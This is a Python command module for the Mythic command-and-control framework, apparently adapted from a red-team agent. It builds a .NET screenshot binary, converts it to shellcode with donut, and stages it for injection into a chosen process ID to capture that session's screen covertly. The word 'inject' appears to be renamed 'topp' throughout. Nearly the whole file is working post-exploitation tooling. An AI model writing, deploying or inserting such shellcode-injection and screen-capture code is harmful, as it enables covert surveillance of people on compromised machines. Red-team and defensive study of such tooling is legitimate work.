import os
from mythic_container.MythicCommandBase import *
from uuid import uuid4
import json
from os import path
from mythic_container.MythicRPC import *
import base64
import tempfile
from distutils.dir_util import copy_tree
import shutil
import os
import asyncio
import donut

SCREENSHOT_topp = "/srv/Screenshottopp.exe"


class ScreenshottoppArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number, description="Process ID to topp into."),
            CommandParameter(
                name="count",
                cli_name="Count",
                display_name="Number of Screenshots",
                type=ParameterType.Number,
                description="The number of screenshots to take when executing.",
                default_value=1,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                    ),
                ]),
            CommandParameter(
                name="interval",
                cli_name="Interval",
                display_name="Interval Between Screenshots", 
                type=ParameterType.Number, 
                description="Interval in seconds to wait between capturing screenshots. Default 0.",
                default_value=0,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                    ),
                ])
        ]

    async def parse_arguments(self):
        if not len(self.command_line):
            raise Exception("Usage: {}".format(ScreenshottoppCommand.help_cmd))
        self.load_args_from_json_string(self.command_line)
        self.add_arg("pipe_name", str(uuid4()))


class ScreenshottoppCommand(CommandBase):
    cmd = "screenshot_topp"
    needs_admin = False
    help_cmd = "screenshot_topp [pid] [count] [interval]"
    description = "Take a screenshot in the session of the target PID"
    version = 2
    author = "@reznok, @djhohnstein"
    argument_class = ScreenshottoppArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
    attackmapping = ["T1113"]
    supported_ui_features=["screenshot_topp"]

    async def build_screenshottopp(self):
        global SCREENSHOT_topp
        agent_build_path = tempfile.TemporaryDirectory()
        outputPath = "{}/Screenshottopp/bin/Release/Screenshottopp.exe".format(agent_build_path.name)
            # shutil to copy payload files over
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/Screenshottopp/Screenshottopp.csproj -o {}/Screenshottopp/bin/Release/".format(agent_build_path.name, agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build Screenshottopp.exe:\n{}".format(stdout.decode() + "\n" + stderr.decode()))
        shutil.copy(outputPath, SCREENSHOT_topp)


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global SCREENSHOT_topp
        if not path.exists(SCREENSHOT_topp):
            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                TaskID=taskData.Task.ID,
                UpdateStatus=f"building topping stub"
            ))
            await self.build_screenshottopp()
        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=taskData.Task.ID,
            UpdateStatus=f"generating stub shellcode"
        ))
        donutPic = donut.create(
            file=SCREENSHOT_topp, params=taskData.args.get_arg("pipe_name")
        )
        file_resp = await SendMythicRPCFileCreate(
            MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID, FileContents=donutPic, DeleteAfterFetch=True
            )
        )
        if file_resp.Success:
            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
        else:
            raise Exception(
                "Failed to register screenshot_topp stub binary: " + file_resp.Error
            )
        response.DisplayParams = "-PID {}".format(taskData.args.get_arg("pid"))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp